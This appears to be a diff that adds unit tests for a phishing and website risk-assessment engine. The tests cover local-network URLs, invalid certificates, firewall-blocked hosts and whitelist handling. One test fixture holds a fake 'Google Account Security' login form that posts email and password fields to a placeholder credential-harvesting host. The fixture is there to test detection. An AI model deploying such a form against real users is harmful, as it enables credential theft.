@@ -79,3 +79,70 @@ def test_verified_threat_intel_sets_critical():
     assert res["overall_risk_level"] == "CRITICAL"
     assert res["dimensions"]["phishing_risk"]["level"] == "CRITICAL"
 
+
+def test_local_network_returns_unverified_not_safe():
+    engine = HybridRiskEngine()
+    res = engine.assess(
+        url="http://127.0.0.1:3000/dashboard",
+        hostname="127.0.0.1",
+        is_local=True,
+        has_dom_observation=True,
+    )
+    assert res["overall_risk_level"] == "UNKNOWN"
+    assert res["operational_status"] == "LOCAL_NETWORK_UNVERIFIED"
+    assert res["connection_security"] == "LOCAL_NETWORK_UNVERIFIED"
+    assert res["phishing_probability"] is None
+
+
+def test_whitelist_never_overrides_malicious_dom_or_threat_intel():
+    engine = HybridRiskEngine()
+    phish_html = """
+    <html><head><title>Google Account Security</title></head>
+    <body><form method="post" action="https://cred-harvest.invalid/post">
+    <input type="email" name="email"/><input type="password" name="pw"/>
+    <button type="submit">Verify</button></form></body></html>
+    """
+    dom = extract_dom_features_from_html("https://google.com/compromised-page", phish_html)
+    res = engine.assess(
+        url="https://google.com/compromised-page",
+        url_threat_prob=0.12,
+        dom_threat_prob=0.91,
+        dom_features=dom,
+        is_whitelisted=True,
+        has_dom_observation=True,
+    )
+    assert res["overall_risk_level"] in ("HIGH", "CRITICAL")
+    assert res["dimensions"]["credential_risk"]["level"] in ("MEDIUM", "HIGH", "CRITICAL")
+    assert res["dimensions"]["credential_risk"]["score"] >= 0.50
+
+
+def test_invalid_certificate_flagged_separately_and_missing_model_returns_null_prob():
+    engine = HybridRiskEngine()
+    res = engine.assess(
+        url="https://expired-cert.invalid/",
+        url_threat_prob=None,
+        dom_threat_prob=None,
+        intel_result={"tls": {"ssl_error": True, "ssl_error_detail": "CERTIFICATE_VERIFY_FAILED"}},
+        has_dom_observation=False,
+    )
+    assert res["phishing_probability"] is None
+    assert res["connection_security"] == "INVALID_CERTIFICATE"
+    assert res["dimensions"]["connection_security"]["level"] == "HIGH"
+    assert res["overall_risk_level"] == "HIGH"
+    assert res["heuristic_risk_index"] >= 65
+
+
+def test_firewall_blocked_host_is_blocked_status_not_malware():
+    engine = HybridRiskEngine()
+    res = engine.assess(
+        url="https://corporate-blocked.invalid/",
+        url_threat_prob=None,
+        dom_threat_prob=None,
+        reachability={"dns_sinkholed": True, "connection_blocked": True},
+        has_dom_observation=False,
+    )
+    assert res["operational_status"] == "Blocked"
+    assert res["phishing_probability"] is None
+    assert res["dimensions"]["malware_risk"]["level"] == "UNKNOWN"
+
+
